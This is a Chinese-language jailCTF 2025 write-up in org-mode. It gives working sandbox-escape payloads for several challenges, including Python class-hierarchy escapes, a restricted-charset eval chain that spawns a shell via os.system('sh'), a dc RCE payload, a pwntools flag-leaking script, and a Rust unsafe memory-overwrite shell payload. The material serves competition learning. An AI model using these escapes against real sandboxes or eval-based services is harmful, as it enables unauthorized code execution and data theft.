@@ -1,0 +1,309 @@
+#+TITLE: jailCTF 2025 writeup
+#+DATE: <2025-10-07 Tue>
+
+* Day 1
+** ASMaaS
+#+BEGIN_SRC asm
+#include "flag.txt"
+    or
+.incbin "flag.txt"
+#+END_SRC
+
+** blindness
+[[https://skyi23.github.io/2025/08/12/Python 沙箱逃逸][Python 沙箱逃逸技术合集]]
+#+BEGIN_SRC python
+().__class__.__base__.__subclasses__()[144].__init__.__globals__['__builtins__']['print'](flag, file=().__class__.__base__.__subclasses__()[144].__init__.__globals__['__builtins__']['__import__']('sys').stderr)
+#+END_SRC
+过于简单，懒得解释
+
+** impossible
+解题&WP by @ishland
+
+#+BEGIN_SRC python
+eval(''.join(c for c in input('> ') if c in "abcdefghijklmnopqrstuvwxyz:_.[]"))
+#+END_SRC
+
+没有小括号不能直接构造函数调用，没有引号也不能直接构造字符串常量
+=__repr__= 不能直接用，因为最后的并没有print，除非手动构造一个
+考虑 =__getattribute__=, =obj.attr= 会变成 =obj.__class__.__getattribute__("attr")=
+然后就是找两个东西，这里找了 license 和 help
+构造 =__import__("os").system("sh")=
+
+#+BEGIN_SRC python
+license.__class__.__getattribute__ = __import__
+help.__class__.__getattribute__ = license.os.system
+#+END_SRC
+
+使用for我也不知道叫什么的那玩意进行变量赋值，以避开等号和空格进行赋值
+#+BEGIN_SRC python
+[[license.os.system]for[license.__class__.__getattribute__]in[[__import__]]]
+[[help.sh]for[help.__class__.__getattribute__]in[[license.os.system]]]
+#+END_SRC
+
+然后串一下
+#+BEGIN_SRC python
+[[[[help.sh]for[help.__class__.__getattribute__]in[[license.os.system]]]]for[license.__class__.__getattribute__]in[[__import__]]]
+#+END_SRC
+即可getshell
+
+** dcjail
+幽默 GNU
+#+BEGIN_SRC python
+import os
+
+inp = input('> ')
+if any(c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy' for c in inp):  # they gave me no blue raspberry dawg
+    print('bad. dont even try using lowercase z')
+    exit(1)
+
+with open('/tmp/code.txt', 'w') as f:
+    f.write(inp)
+
+os.system(f'/usr/bin/dc -f /tmp/code.txt')
+print("stop. you're done. get out.")
+#+END_SRC
+
+先看 man! 发现两个指令 =!= =?= 都可以导致 RCE
+#+BEGIN_EXAMPLE
+?
+    Reads a line from the terminal and executes it. This command allows a macro to request input from the user.
+!
+    Will run the rest of the line as a system command.
+#+END_EXAMPLE
+显然这两个都不在上面的字符里
+然后 GNU 幽默地加入了 =a= 指令可以 pop 一个数字 push 一个 char，即使 deprecated 也依旧保留
+#+BEGIN_EXAMPLE
+63ap
+dc: warning: 'a' command is deprecated
+        (contact <bug-dc@gnu.org> if you actually use it)
+?
+#+END_EXAMPLE
+#+BEGIN_SRC c
+	case 'a':	/* Convert top of stack to an ascii character. */
+		if (dc_pop(&datum) == DC_SUCCESS){
+			char tmps;
+			if (datum.dc_type == DC_NUMBER){
+				tmps = (char) dc_num2int(datum.v.number, DC_TOSS);
+			}else if (datum.dc_type == DC_STRING){
+				tmps = *dc_str2charp(datum.v.string);
+				dc_free_str(&datum.v.string);
+			}else{
+				dc_garbage("at top of stack", -1);
+			}
+			dc_push(dc_makestring(&tmps, 1));
+		}
+		break;
+#+END_SRC
+=x= 指令可以 pop 一个 string 当作 macro 执行
+理论成立，实践开始！
+
+由于字符限制不能输入数字，但可以平方再 =v= 开方，一次不行就两次
+#+BEGIN_EXAMPLE
+FAAAAAAvvap
+?
+#+END_EXAMPLE
+所以 payload 就是 =FAAAAAAvvax=
+
+* Day 2
+** rustjail
+这题是半道才出来的，我也是靠这题拿下的 *第 10 名*
+#+BEGIN_SRC python
+import string
+import os
+
+allowed = set(string.ascii_lowercase+string.digits+' :._(){}"')
+
+os.environ['RUSTUP_HOME']='/usr/local/rustup'
+os.environ['CARGO_HOME']='/usr/local/cargo'
+os.environ['PATH']='/usr/local/cargo/bin:/usr/bin'
+
+inp = input("gib cod: ").strip()
+if not allowed.issuperset(set(inp)):
+    print("bad cod")
+    exit()
+else:
+    print(inp)
+with open("/tmp/cod.rs", "w") as f:
+    f.write(inp)
+os.system("/usr/local/cargo/bin/rustc /tmp/cod.rs -o /tmp/cod")
+os.system("/tmp/cod; echo Exited with status $?")
+#+END_SRC
+试了一圈发现没法直接输出 flag，但是有返回值所以可以一个一个字符蹦。
+#+BEGIN_SRC python
+from pwn import *
+
+res = []
+
+for i in range(40):
+    io = remote('challs2.pyjail.club', 9999)
+    payload = 'fn main() { std::process::exit(std::fs::read("flag.txt").unwrap().into_iter().nth(' + f'{i}' + ').unwrap().into()) }'
+    io.sendlineafter('gib cod: ', payload)
+    io.recvuntil('with status ')
+    res.append(chr(int(io.recv())))
+    print(''.join(res))
+#+END_SRC
+
+** calcdefanged
+解题&WP by @ishland
+
+题目检查输入长度小于75，第一个字符为 ~[0-9+\-*/]+~ ，直接用 ~0,~ 绕过即可
+题目上加入audit hook之后又卸载了，在卸载后才把结果进行print，考虑攻击 ~__repr__~
+
+理论上可以使用任意mutable class，例如 ~help.__class__.__repr__~ ，
+但是题目过滤空格和下划线， ~__class__~ 这种字符串要继续构造，所以这里使用 ~license~ ，
+因为劫持 ~license._Printer__setup~ 就好了，降低payload过长的可能性
+
+~_Printer__setup~ 使用 ~dir(license)[5]~ 代替，使用 ~setattr(obj,str,any)~ 代替 ~license._Printer__setup = any~ 赋值语句，
+扔一个lambda进去就解决在audit hook卸载后代码执行问题
+
+但是一行做完exploit不现实，主要是payload长度限制，考虑双步执行，使用 ~eval(input())~ 解决问题
+
+#+BEGIN_SRC python
+0,setattr(license,dir(license)[5],lambda:eval(input())),license
+#+END_SRC
+
+长度不超过75限制，进去之后扔 ~__import__("os").system("sh")~ 即可，然后即可getshell
+
+* Day 3
+一道题也没搞出来
+
+* 终
+最高排名 10，最终排名 40。
+
+看看别人的 writeup 长长脑子吧
+
+** rustjail
+[[https://github.com/mirelgigel/writeupjailctf][@mirelgigel]]
+#+BEGIN_SRC rust
+fn main(){std::panic::panic_any(std::fs::read_to_string("flag.txt").unwrap())}
+#+END_SRC
+
+@toxicpie
+直接 getshell 了
+#+BEGIN_SRC rust
+fn main() {
+    unsafe {
+        true.then_some(
+            true.then_some(0_u64)
+                .as_mut_slice()
+                .as_mut_ptr()
+                .byte_add(0x50)
+                .write(
+                    true.then_some(0_u64)
+                        .as_slice()
+                        .as_ptr()
+                        .byte_add(0x1e0)
+                        .read()
+                        .wrapping_add(0x1324c),
+                ),
+        )
+        .is_some()
+        .then_some(
+            true.then_some(0_u64)
+                .as_mut_slice()
+                .as_mut_ptr()
+                .byte_add(0x38)
+                .write(0),
+        )
+        .is_some()
+        .then_some(
+            true.then_some(0_u64)
+                .as_mut_slice()
+                .as_mut_ptr()
+                .byte_add(0x30)
+                .write(
+                    true.then_some(0_u64)
+                        .as_slice()
+                        .as_ptr()
+                        .byte_add(0x1b0)
+                        .read()
+                        .wrapping_add(0x24eef),
+                ),
+        )
+        .unwrap()
+    }
+}
+#+END_SRC
+
+** jailia
+#+BEGIN_SRC julia
+function check(ex)
+    if ex isa Expr
+        if ex.head in (:call, :macrocall, :.)
+            println("bad expression: $(ex.head)")
+            exit()
+        end
+        for arg in ex.args
+            check(arg)
+        end
+    end
+end
+
+print("Input a Julia expression: ")
+code = readline()
+ex = Meta.parse(code)
+check(ex)
+eval(ex)
+#+END_SRC
+就是个操作符重载，当时想到但没细想。
+
+** brainfudge
+前置知识
+#+BEGIN_SRC python
+>>> +True
+1
+>>> +False
+0
+>>> -True
+-1
+>>> ...
+Ellipsis
+#+END_SRC
+@flocto
+=--++[[[]]>[]][[]<[]]= 可以任意叠加产生 python 数字并保持 bf 状态不变
+然后就可以得出 111 解法
+
+然后还有一种 =[[[]]]= 解法暂时没看懂
+
+** stupɪd si plʌs plʌs
+#+BEGIN_SRC python
+re.fullmatch(r'[a-z *;_]+', code)
+#+END_SRC
+[[https://cdn.discordapp.com/attachments/1424825718029811813/1424855320399974431/a.cpp?ex=68e5776c&is=68e425ec&hm=58d2e4ee81fdceca32b0b0af0dbb4ee054677778ba402e370c419da3256080e9&][@toxicpie]]
+1. operators we can use: `*` (multiplication, pointers and dereferencing), bit operations (`bitand`, ...), bit+assign operations (`and_eq`, ...)
+2. create 0 from xor, 1 and 2 from `sizeof`, 2^n from multiplying 2
+3. create any constant by using `bit_or` on 2^n
+4. can perform addition using bit operations and *2
+5. use `extern unsigned long environ;` to obtain a pointer to somewhere on the stack
+6. combine 3, 4 and 5 to obtain a pointer to the return address
+7. use `extern unsigned long stdin;` to obtain a pointer to inside libc
+8. combine 3, 4 and 7 to obtain some rop gadgets
+9. 🤯
+
+** monkeval
+#+BEGIN_SRC perl
+$*OUT.out-buffer = False;
+$*ERR.out-buffer = False;
+
+# 🙈🙈🙈
+sub MONKEY-SEE-NO-EVAL { 1 }
+
+constant @allowed-charset = '()0123456789+-*/^~<=>$_ '.comb;
+
+loop {
+    my $input = prompt 'Enter a math expression: ';
+
+    exit if $input eq 'exit';
+
+    if $input.comb ⊈ @allowed-charset {
+        say 'Invalid expression!';
+        next;
+    }
+
+    $_ = EVAL($input);
+    say $_;
+}
+#+END_SRC
+
+string xor + regex eval
+看不懂
